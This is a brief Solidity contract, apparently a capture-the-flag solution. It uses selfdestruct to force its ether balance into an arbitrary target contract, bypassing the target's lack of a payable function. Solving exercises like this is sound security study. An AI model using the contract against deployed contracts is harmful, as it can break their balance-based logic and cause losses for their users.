//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract breakForce {
  constructor() payable {}

  function receiveAndSelfDestruct(address payable _target) external payable {
    selfdestruct(_target);
  }
}
